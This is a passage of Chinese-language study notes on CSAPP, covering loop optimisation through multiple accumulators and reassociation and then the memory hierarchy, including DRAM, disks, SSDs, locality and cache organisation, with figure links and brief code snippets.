多个累积变量</h4><ul><li>对于一个可结合和可交换的合并运算来说，比如说整数加法或乘法，我们可以通过将一组合并运算分割成两个或更多的部分，并在最后合并结果来提高性能。</li></ul><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615163503654.png" alt="image-20210615163503654"></p><ul><li><p>可以看到，现在有两条关键路径，一条对应于计算索引为偶数的元素的乘积（程序值acc0），另一条对应于计算索引为奇数的元素的乘积（程序值acc1）。</p><ul><li>每条关键路径只包含n/2个操作。</li><li>对于不同的数据类型和合并运算的组合，延迟为L的操作的CPE等于L/2。</li></ul><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615162138941.png" alt="image-20210615162138941"></p></li><li><p>对于大多数应用程序来说，使性能翻倍要比冒对奇怪的数据模式产生不同的结果的风险更重要。</p></li></ul><h4 id="5-9-2-重新结合变换"><a href="#5-9-2-重新结合变换" class="headerlink" title="5.9.2 重新结合变换"></a>5.9.2 重新结合变换</h4><ul><li><p>在combnie5中，合并是以下面这条语句来实现的</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">acc = (acc OP data[i]) OP data[i+<span class="hljs-number">1</span>];<br></code></pre></div></td></tr></table></figure></li><li><p>而在combine7中，合并是以这条语句来实现的</p><figure class="highlight haskell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haskell"><span class="hljs-title">acc</span> = acc <span class="hljs-type">OP</span> (<span class="hljs-class"><span class="hljs-keyword">data</span>[i] <span class="hljs-type">OP</span> <span class="hljs-keyword">data</span>[i+1]);</span><br></code></pre></div></td></tr></table></figure></li><li><p>差别仅在于两个括号是如何放置的，我们称之为<strong>重新结合变换</strong>（rreassociation transformation)，因为括号改变了向量元素与累计值acc的合并顺序，产生了我们称为“2x1a”的循环展开形式。</p></li><li><p>每次迭代内的第一个乘法都不需要等待前一次迭代的累计值就可以执行。因此，最小可能的CPE减小了2倍。</p></li><li><p>总的来说，重新结合变换能够减少计算中关键路径上操作的数量，通过更好地利用功能单元的流水线能力得到更好的性能。</p></li><li>大多数编译器不会尝试对浮点运算重新结合，因为这些运算不保证是可结合的。</li></ul><h3 id="5-10-优化合并代码的结果小结"><a href="#5-10-优化合并代码的结果小结" class="headerlink" title="5.10 优化合并代码的结果小结"></a>5.10 优化合并代码的结果小结</h3><h3 id="5-11-一些限制因素"><a href="#5-11-一些限制因素" class="headerlink" title="5.11 一些限制因素"></a>5.11 一些限制因素</h3><ul><li>关键路径指明了执行该程序所需时间的一个基本的下界。也就是说，如果程序中有某条数据相关链，这条链上的所有延迟之和等于T，那么这个程序至少需要T个周期才能执行完。</li><li>我们还看到功能单元的吞吐量界限也是程序执行时间的一个下界。也就是说，假设一个程序一共需要N个某种运算的计算，而微处理器只有C个能执行这个操作的功能单元，并且这些单元的发射时间为I。那么这个程序的执行至少需要N*I/C个周期。</li></ul><h4 id="5-11-1-寄存器溢出"><a href="#5-11-1-寄存器溢出" class="headerlink" title="5.11.1 寄存器溢出"></a>5.11.1 寄存器溢出</h4><ul><li>如果我们的并行度p超过了可用的寄存器数量，那么编译器会<strong>溢出</strong>（spilling），将某些临时值存放到内存中，通常是在运行时堆栈上分配空间。</li></ul><h4 id="5-11-2-分支预测和预测错误处罚"><a href="#5-11-2-分支预测和预测错误处罚" class="headerlink" title="5.11.2 分支预测和预测错误处罚"></a>5.11.2 分支预测和预测错误处罚</h4><h5 id="不要过分关心可预测的分支"><a href="#不要过分关心可预测的分支" class="headerlink" title="不要过分关心可预测的分支"></a>不要过分关心可预测的分支</h5><h3 id="5-12-理解内存性能"><a href="#5-12-理解内存性能" class="headerlink" title="5.12 理解内存性能"></a>5.12 理解内存性能</h3><h4 id="5-12-1-加载的性能"><a href="#5-12-1-加载的性能" class="headerlink" title="5.12.1 加载的性能"></a>5.12.1 加载的性能</h4><ul><li>对两个加载单元而言，其每个时钟周期只能启动一条加载操作，所以CPE不可能小于0.50，对于每个被计算的元素必须加载k个值的应用，我们不可能获得低于k/2的CPE。</li></ul><h4 id="5-12-2-存储的性能"><a href="#5-12-2-存储的性能" class="headerlink" title="5.12.2 存储的性能"></a>5.12.2 存储的性能</h4><ul><li><p>与加载操作一样，在大多数情况中，存储操作能够在完全流水化的模式中工作，每个周期开始一条新的存储。</p></li><li><p>与到目前为止我们已经考虑过的其他操作不同，存储操作并不影响任何寄存器的值。因此，就其本性来说，一系列存储操作不会产生数据相关。只有加载操作会受存储操作结果的影响，因为只有加载操作能从由存储操作写的那个位置读回值。</p><ul><li>在图5-33的示例A中，参数src是一个指向数组元素a[0]的指针，而dest是一个指向数组元素a[1]的指针。从src读出的结果不受对dest的写的影响。在较大次数的迭代上测试这个示例得到CPE等于1.3。</li><li>在图5-33的示例B中，参数src和dest都是指向数组元素a[0]的指针。在这种情况中，指针引用*src的每次加载都会得到指针引用*dest的前次执行存储的值。一个内存读的结果依赖于一个最近的内存写。我们的性能测试表明示例B的CPE为7.3。写/读相关导致处理速度下降约6个时钟周期。</li></ul><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615170347062.png" alt="image-20210615170347062"></p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615170401671.png" alt="image-20210615170401671"></p></li><li><p>这张图中s_data和load操作之间由虚弧线。这个数据相关是有条件的：如果两个地址相同，load操作必须等待直到s_data将它的结果存放到存储缓冲区中，但是如果两个地址不同，两个操作就可以独立地进行。</p></li></ul><h3 id="5-13-应用：性能提高技术"><a href="#5-13-应用：性能提高技术" class="headerlink" title="5.13 应用：性能提高技术"></a>5.13 应用：性能提高技术</h3><ul><li>1) 高级设计。为遇到的问题选择适当的算法和数据结构。</li><li>2) 基本编码原则。避免限制优化的元素，这样编译器就能产生高效的代码。<ul><li>消除连续的函数调用。</li><li>消除不必要的内存引用。</li></ul></li><li>3) 低级优化。<ul><li>展开循环</li><li>通过使用例如多个累积变量和重新结合等技术，找到方法提高指令级并行。</li><li>用功能性的风格重写条件操作，使得编译采用条件数据传送。</li></ul></li></ul><h3 id="5-14-确认和消除性能瓶颈"><a href="#5-14-确认和消除性能瓶颈" class="headerlink" title="5.14 确认和消除性能瓶颈"></a>5.14 确认和消除性能瓶颈</h3><h4 id="5-14-1-程序剖析"><a href="#5-14-1-程序剖析" class="headerlink" title="5.14.1 程序剖析"></a>5.14.1 程序剖析</h4><h4 id="5-14-2-使用剖析程序来指导优化"><a href="#5-14-2-使用剖析程序来指导优化" class="headerlink" title="5.14.2 使用剖析程序来指导优化"></a>5.14.2 使用剖析程序来指导优化</h4><h3 id="5-15-小结"><a href="#5-15-小结" class="headerlink" title="5.15 小结"></a>5.15 小结</h3><h2 id="第6章-存储器层次结构"><a href="#第6章-存储器层次结构" class="headerlink" title="第6章 存储器层次结构"></a>第6章 存储器层次结构</h2><ul><li><strong>存储器系统</strong>（memory system）是一个具有不同容量、成本和访问时间的存储设备的层次结构。CPU寄存器保持着最常用的数据。靠近CPU的小的、快速的<strong>高速缓存存储器</strong>（cache memory）作为一部分存储在相对慢速的主存储器（main memory）中数据和指令的缓冲区域。</li><li>计算机系统中一个基本而持久的思想：如果你理解了系统是如何将数据在存储器层次结构中上上下下移动的，那么你就可以编写自己的应用程序，使得它们的数据项存储在层次结构中较高的地方，在那里CPU能更快地访问到它们。</li><li>这个思想围绕着计算机程序的一个称为<strong>局部性</strong>（locality）的基本属性。</li></ul><h3 id="6-1-存储技术"><a href="#6-1-存储技术" class="headerlink" title="6.1 存储技术"></a>6.1 存储技术</h3><h4 id="6-1-1-随机访问存储器"><a href="#6-1-1-随机访问存储器" class="headerlink" title="6.1.1 随机访问存储器"></a>6.1.1 随机访问存储器</h4><ul><li><p><strong>随机访问存储器</strong>（Random-Access Memory，RAM）分为两类：静态的和动态的。<strong>静态RAM（SRAM）</strong>比<strong>动态RAM（DRAM）</strong>更快，但也贵很多。</p><ol><li><p>静态RAM</p></li><li><p>动态RAM</p></li></ol><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615171808860.png" alt="image-20210615171808860"></p><ol><li><p>传统的DRAM</p><p>DRAM芯片中的单元（位）被分成$d$个<strong>超单元</strong>（supercell），每个超单元都由$w$个DRAM单元组成，一个$d\times w$的DRAM总共存储了$dw$位信息。超单元被组织成一个$r$行$c$列的长方形阵列，这里$rc=d$。每个超单元有形如$(i,j)$的地址，这里$i$表示行，而$j$表示列。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615172402478.png" alt="image-20210615172402478"></p><p>每个DRAM芯片被连接到某个称为<strong>内存控制器</strong>（memory controller）的电路，这个电路可以一次传送$w$位到每个DRAM芯片或一次从每个DRAM芯片传出$w$位。为了读出超单元（$i,j$）的内容，内存控制器将行地址$i$发送到DRAM，然后是列地址$j$。DRAM把超单元$(i,j)$的内容发回给控制器作为响应。行地址$i$称为RAS（Row Access Strobe，行访问选通脉冲）请求。列地址$j$称为CAS（Column Access Strobe，列访问选通脉冲）请求。注意，RAS和CAS请求共享相同的DRAM地址引脚。</p></li></ol><ul><li>要取出内存地址A处的一个字，内存控制器将A转换成一个超单元地址$(i,j)$，并将它发送到内存模块，然后内存模块再将$i$和$j$广播道每个DRAM。作为响应，每个DRAM输出它的$(i,j)$超单元的8位内容。模块中的电路手机这些输出，并把它们合并成一个64位字，再返回给内存控制器。</li></ul><ol><li><p>增强的DRAM</p><ul><li>快页模式DRAM（Fast Page Mode DRAM，FPM DRAM）。</li><li>扩展数据输出DRAM（Extended Data Out DRAM，EDO DRAM）。FPM DRAM的一个增强的形式。</li><li>同步DRAM（Synchronous DRAM，SDRAM）。</li><li>双倍数据速率同步DRAM（Double Data-Rate Synchronous DRAM，DDR SDRAM），是对SDRAM的一种增强。</li><li>视频RAM（Video RAM，VRAM）。</li></ul></li><li><p>非易失性存储器</p><ul><li>PROM（Programmable ROM，可编程ROM）只能被编程一次。</li><li>可擦写可编程ROM（Erasable Programmable ROM，EPROM）。</li><li>电子可擦除PROM（Electrically Erasable PROM，EEPROM）类似于EPROM，但是它不需要一个物理上独立的编程设备，</li><li><strong>闪存</strong>（flash memory）是一类非易失性存储器，基于EEPROM，它已经成为了一种重要的存储技术。</li><li>存储在ROM设备中的程序通常被称为<strong>固件</strong>（firmware）</li></ul></li><li><p>访问内存</p><ul><li>数据流通过称为<strong>总线</strong>（bus）的共享电子电路在处理器和DRAM主存之间来来回回。每次CPU和主存之间的数据传送都是通过一系列步骤来完成的，这些步骤称为<strong>总线事务</strong>（bus transaction）。<ul><li><strong>读事务</strong>（read transaction）从主存传送数据到CPU。</li><li><strong>写事务</strong>（write transaction）从CPU传送数据到主存。</li></ul></li></ul><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615174054455.png" alt="image-20210615174054455"></p></li></ol></li></ul><h4 id="6-1-2-磁盘存储"><a href="#6-1-2-磁盘存储" class="headerlink" title="6.1.2 磁盘存储"></a>6.1.2 磁盘存储</h4><ul><li><strong>磁盘</strong>是广为应用的保存大量数据的存储设备，存储数据的数量级可以达到几百到几千兆字节，而基于RAM的存储器只能有几百或几千兆字节。不过，从磁盘上读信息的时间为毫秒级，比从DRAM读慢了10万倍，比从SRAM读慢了100万倍。</li></ul><h5 id="1-磁盘构造"><a href="#1-磁盘构造" class="headerlink" title="1.磁盘构造"></a>1.磁盘构造</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615174443162.png" alt="image-20210615174443162" style="zoom:80%;"></p><p>  <img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615174459503.png" alt="image-20210615174459503" style="zoom:80%;"></p><h5 id="2-磁盘容量"><a href="#2-磁盘容量" class="headerlink" title="2. 磁盘容量"></a>2. 磁盘容量</h5><ul><li>一个磁盘上可以记录的最大位数称为它的<strong>最大容量</strong>，或者简称为<strong>容量</strong>。磁盘容量是由以下技术因素决定的：<br><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615174625772.png" alt="image-20210615174625772"></li><li><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615174643305.png" alt="image-20210615174643305"></li></ul><h5 id="3-磁盘操作"><a href="#3-磁盘操作" class="headerlink" title="3.磁盘操作"></a>3.磁盘操作</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615174710471.png" alt="image-20210615174710471" style="zoom:80%;"></p><ul><li><p>磁盘以扇区大小的块来读写数据。对扇区的<strong>访问时间</strong>（access time）有三个主要的部分：<strong>寻道时间</strong>（seek time）、<strong>旋转时间</strong>（rotational latency）和<strong>传送时间</strong>（transfer time）：</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615174928908.png" alt="image-20210615174928908"></p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615174941992.png" alt="image-20210615174941992"></p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615174954523.png" alt="image-20210615174954523"></p></li><li><p>我们可以估计访问一个磁盘扇区内容的平均时间为平均寻道时间、平均旋转延迟和平均传送时间之和。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615175049542.png" alt="image-20210615175049542"></p></li></ul><h5 id="4-逻辑磁盘块"><a href="#4-逻辑磁盘块" class="headerlink" title="4.逻辑磁盘块"></a>4.逻辑磁盘块</h5><ul><li>一个B个扇区大小的<strong>逻辑块</strong>的序列，编号为0，1，…，B-1。磁盘封装中有一个小小的硬件/固件设备，称为<strong>磁盘控制器</strong>，维护者逻辑块号和实际（物理）磁盘扇区之间的映射关系。</li><li>当操作系统想要执行一个I/O操作时，例如读一个磁盘扇区的数据到主存，操作系统会发送一个命令到磁盘控制器，让它读某个逻辑块号。控制器上的固件执行一个快速表查找，将一个逻辑块号翻译成一个（盘面，磁道，扇区）的三元组，这个三元组唯一地标识了对应的物理扇区。</li></ul><h5 id="5-连接I-O设备"><a href="#5-连接I-O设备" class="headerlink" title="5. 连接I/O设备"></a>5. 连接I/O设备</h5><h5 id="6-访问磁盘"><a href="#6-访问磁盘" class="headerlink" title="6. 访问磁盘"></a>6. 访问磁盘</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210615175559948.png" alt="image-20210615175559948"></p><h4 id="6-1-3-固态硬盘"><a href="#6-1-3-固态硬盘" class="headerlink" title="6.1.3 固态硬盘"></a>6.1.3 固态硬盘</h4><ul><li>读SSD比写要块。随机读和写的性能差别是由底层闪存基本属性决定的。</li><li>如图6-13所示，一个闪存由B个块的序列组成，每个块由P页组成。</li><li>只有在一页所属的块整个<strong>被擦除</strong>之后，才能写这一页（通常是指该块中的所有位都被设置为1）。</li></ul><h3 id="6-2-局部性"><a href="#6-2-局部性" class="headerlink" title="6.2 局部性"></a>6.2 局部性</h3><ul><li>一个编写良好的计算机程序常常具有良好的<strong>局部性</strong>（locality)。也就是，它们倾向于引用邻近于其他最近引用过的数据项的数据项，或者最近引用过的数据项本身。这种倾向性，被称为<strong>局部性原理</strong>（principle of locality）。</li><li>局部性通常有两种不同的形式：<strong>时间局部性</strong>（temporal locality）和<strong>空间局部性</strong>（spatial locality）。<ul><li>在一个具有良心时间局部性的程序中，被引用过一次的内存位置很可能在不远的将来再被多次引用。</li><li>再一个具有良好的空间局部性的程序中，如果一个内存位置被引用了一次，那么程序很可能再不远的将来引用附近的一个内存位置。</li></ul></li><li>一般而言，有<strong>良好局部性的程序比局部性差的程序运行得更快</strong>。</li></ul><h4 id="6-2-1-对程序数据引用的局部性"><a href="#6-2-1-对程序数据引用的局部性" class="headerlink" title="6.2.1 对程序数据引用的局部性"></a>6.2.1 对程序数据引用的局部性</h4><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616163626300.png" alt="image-20210616163626300"></p><ul><li><p>像sumvec这样顺序访问一个向量每个元素的函数，具有<strong>步长为1</strong>的<strong>引用模式</strong>（stride-1 reference pattern)（相对于元素的大小）。有时我们称步长为1的引用模式为<strong>顺序引用模式</strong>（sequential reference pattern）。一个连续向量中，每隔k个元素进行访问，就称为<strong>步长为k的引用模式</strong>（stride-k reference pattern）。步长为1的引用模式是程序中空间局部性常见和重要的来源。一般而言，随着步长的增加，空间局部性下降。</p></li><li><p>考虑图6-18a中的函数sumarrayrows，它对一个二维数组的元素求和。双重嵌套循环按照<strong>行优先顺序</strong>（row-major order）读数组的元素。</p><ul><li>其结果是得到一个很好的步长为1的引用模式，具有良好的空间局部性。</li></ul><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616170418768.png" alt="image-20210616170418768"></p></li><li><p>交换了i和j的循环，局部性变得很差：</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616170449047.png" alt="image-20210616170449047"></p></li></ul><h4 id="6-2-2-取指令的局部性"><a href="#6-2-2-取指令的局部性" class="headerlink" title="6.2.2 取指令的局部性"></a>6.2.2 取指令的局部性</h4><h4 id="6-2-3-局部性小结"><a href="#6-2-3-局部性小结" class="headerlink" title="6.2.3 局部性小结"></a>6.2.3 局部性小结</h4><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616170616488.png" alt="image-20210616170616488"></p><h3 id="6-3-存储器层次结构"><a href="#6-3-存储器层次结构" class="headerlink" title="6.3 存储器层次结构"></a>6.3 存储器层次结构</h3><ul><li><p>硬件和软件的这些基本属性互相补充得很完美。它们这种相互补充的性质使人联像到一种组织存储器系统的方法，称为<strong>存储器层次结构</strong>（memory hierarchy）。</p></li><li><p>一般而言，从高层往底层走，存储设备变得更慢、更便宜和更大。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616170911598.png" alt="image-20210616170911598"></p></li></ul><h4 id="6-3-1-存储器层次结构中的缓存"><a href="#6-3-1-存储器层次结构中的缓存" class="headerlink" title="6.3.1 存储器层次结构中的缓存"></a>6.3.1 存储器层次结构中的缓存</h4><ul><li><p>一般而言，<strong>高速缓存</strong>（cache,读作“cash”）是一个小而快速的存储设备，它作为存储在更大、也更慢的设备中的数据对象的缓冲区域。</p></li><li><p>使用高速缓存的过程称为<strong>缓存</strong>（caching，读作“cashing”）。</p></li><li><p>存储器层次结构的中心思想是，对于每个k，位于k层的更小更快的存储设备作为位于k+1层的更大更慢的存储设备的缓存。</p></li><li><p>图6-22展示了存储器层次结构中缓存的一般性概念。第k+1层的存储器被划分成连续的数据对象组块（chunk），称为<strong>块</strong>（block）。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616171526017.png" alt="image-20210616171526017"></p></li><li><p>数据总是以块大小为<strong>传送单元</strong>（transfer unit）在第k层和第k+1层之间来回复制的。</p></li></ul><h5 id="1-缓存命中"><a href="#1-缓存命中" class="headerlink" title="1.缓存命中"></a>1.缓存命中</h5><ul><li>当程序需要第k+1层的某个数据对象d时，它首先在当前存储在第k层的一个块中查找d。如果d刚好缓存在第k层中，那么就是我们所说的<strong>缓存命中</strong>（cache hit）。</li></ul><h5 id="2-缓存不命中"><a href="#2-缓存不命中" class="headerlink" title="2.缓存不命中"></a>2.缓存不命中</h5><ul><li>另一方面，如果第k层中没有缓存数据对象d，那么就是我们所说的<strong>缓存不命中</strong>（cache miss)。</li><li>当发生缓存不命中时，第k层的缓存从第k+1层缓存中取出包含d的那个块，如果第k层的缓存已经满了，可能就会覆盖一个现存的块。</li><li>覆盖一个现存的块的过程称为<strong>替换</strong>（replace）或<strong>驱逐</strong>（evicting）这个块。被驱逐的这个块有时也称为<strong>牺牲块</strong>（victim block）。决定该替换哪个块是由缓存的<strong>替换策略</strong>（replacement policy）来控制的。例如，一个具有<strong>随机替换策略</strong>的缓存会随机选择一个牺牲块。一个具有最近最少被使用（LRU）替换策略的缓存会选择那个最后被访问的时间距现在最远的块。</li></ul><h5 id="3-缓存不命中的种类"><a href="#3-缓存不命中的种类" class="headerlink" title="3.缓存不命中的种类"></a>3.缓存不命中的种类</h5><ul><li>如果第k层的缓存时空的，那么对任何数据对象的访问都不会命中。一个空的缓存有时被称为<strong>冷缓存</strong>（cold cache），此类不命中被称为<strong>强制性不命中</strong>（compulsory miss）或<strong>冷不命中</strong>（cold miss）。</li><li>只要发生了不命中，第k层的缓存就必须执行某个<strong>放置策略</strong>（placement policy）。</li><li>硬件缓存通常使用的是更严格的放置策略。</li><li>限制性的放置策略会引起一种不命中，称为<strong>冲突不命中</strong>（conflict miss）。</li></ul><h5 id="4-缓存管理"><a href="#4-缓存管理" class="headerlink" title="4.缓存管理"></a>4.缓存管理</h5><h3 id="6-4-高速缓存存储器"><a href="#6-4-高速缓存存储器" class="headerlink" title="6.4 高速缓存存储器"></a>6.4 高速缓存存储器</h3><h5 id="高速缓存存储器的典型总线结构"><a href="#高速缓存存储器的典型总线结构" class="headerlink" title="高速缓存存储器的典型总线结构"></a>高速缓存存储器的典型总线结构</h5><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616194008217.png" alt="image-20210616194008217"></p><h4 id="6-4-1-通用的高速缓存存储器组织结构"><a href="#6-4-1-通用的高速缓存存储器组织结构" class="headerlink" title="6.4.1 通用的高速缓存存储器组织结构"></a>6.4.1 通用的高速缓存存储器组织结构</h4><ul><li><p>考虑一个计算机系统，其中每个存储器地址有$m$位，形成$M=2^m$个不同的地址。如图6-25a所示，这样一个机器的高速缓存被组织成一个有$S=2^s$个<strong>高速缓存组</strong>（cache set）的数组。每个组包含$E$个<strong>高速缓存行</strong>（cache line）。每个行是由一个$B=2^b$字节的数据块（block）组成的。一个<strong>有效位</strong>（valid bit）指明这个行是否包含由意义的信息，还有$t=m-(b+s)$个<strong>标记位</strong>（tag bit）（   集），它们唯一地标识存储在这个高速缓存行的块。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616194515993-1623843917008.png" alt="image-20210616194515993"></p></li><li><p>一般而言，高速缓存的结构可以用元组$(S,E,B,m)$来描述。高速缓存的大小（或容量）$C$指的是所有块的大小的和。标记位和有效位不包括在内。因此，$C=S\times E \times B$。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616194750930.png" alt="image-20210616194750930"></p></li></ul><h4 id="6-4-2-直接映射高速缓存"><a href="#6-4-2-直接映射高速缓存" class="headerlink" title="6.4.2 直接映射高速缓存"></a>6.4.2 直接映射高速缓存</h4><ul><li><p>每个组只有一行（$E=1$）的高速缓存被称为<strong>直接映射</strong>高速缓存（direct-mapped cache）。</p></li><li><p>抽取初被请求的字的过程，分为三步：</p><ol><li>组选择</li><li>行匹配</li><li>字抽取</li></ol><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616195057182.png" alt="image-20210616195057182"></p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616195108596.png" alt="image-20210616195108596"></p></li><li><p>“抖动”：高速缓存反复地加载和驱逐相同的高速缓存块的组。</p></li><li><p>如果高位用做索引，那么一些连续的内存块就会映射到相同的高速缓存块。</p><ul><li>相较而言，以中间位作为索引，相邻的块总是映射到不同的高速缓存行。</li></ul></li></ul><h4 id="6-4-3-组相连高速缓存"><a href="#6-4-3-组相连高速缓存" class="headerlink" title="6.4.3 组相连高速缓存"></a>6.4.3 组相连高速缓存</h4><ul><li><p><strong>组相连高速缓存</strong>（set associative cache）每个组都有保存由多于一个的高速缓存行。</p></li><li><p>它的<strong>组选择</strong>与直接映射高速缓存的组选择一样，组索引位标识组。</p></li><li><p>组相连高速缓存的<strong>行匹配</strong>比直接映射高速缓存中的更复杂，因为它必须检查多行的标记位和有效位，以确定所请求的字是否在集合中。</p><p>​    <img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616200705881.png" alt="image-20210616200705881"></p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616200719291.png" alt="image-20210616200719291"></p></li></ul><h5 id="组相连高速缓存中不命中时的行替换"><a href="#组相连高速缓存中不命中时的行替换" class="headerlink" title="组相连高速缓存中不命中时的行替换"></a>组相连高速缓存中不命中时的行替换</h5><ul><li><p>最简单的替换策略时随机选择要替换的行。</p></li><li><p>其他更复杂发策略利用了局部性原理，以使在比较近的将来引用被替换的行的概率最小。例如，</p><ul><li><strong>最不常使用</strong>（Least-Frequently-Used，LFU）策略会替换在过去某个时间窗口内引用次数最少的那一行。</li><li><strong>最近最少使用</strong>（Least-Recently-Used，LRU）策略会替换最后一次访问时间最久远的那一行。</li></ul><p>所有这些策略都需要额外的时间和硬件。</p></li></ul><h4 id="6-4-4-全相联高速缓存"><a href="#6-4-4-全相联高速缓存" class="headerlink" title="6.4.4 全相联高速缓存"></a>6.4.4 全相联高速缓存</h4><ul><li><p><strong>全相联高速缓存</strong>（fully associative cache）是由一个包含所有高速缓存行的组（即$E=C/B$）组成的。</p></li><li><p>全相联高速缓存中的组选择非常简单，因为只有一个组，地址中没有组索引位，地址只被划分成了一个标记和一个块偏移。</p><p><img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616200750144.png" alt="image-20210616200750144"></p><p>​    <img src="/2021/06/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/image-20210616200804495.png" alt="image-20210616200804495"></p></li><li><p>全相联高速缓存只适合做小的高速缓存。</p></li></ul><h4 id="6-4-5-有关写的问题"><a href="#6-4-5-有关写的问题" class="headerlink" title="6.4.5 有关写的问题"></a>6.4.5 有关写的问题</h4><ul><li>高速缓存关于读的操作非常简单。首先，在高速缓存中查找所需字$w$的副本。如果命中，立即返回字$w$给CPU。如果不命中，从存储器层次结构中较低层中取出包含字$w$的块，将这个块存储到某个高速缓存行中（可能会驱逐一个有效的行，然后返回字$w$）。</li></ul><h5 id="写的情况就要复杂一些了："><a href="#写的情况就要复杂一些了：" class="headerlink" 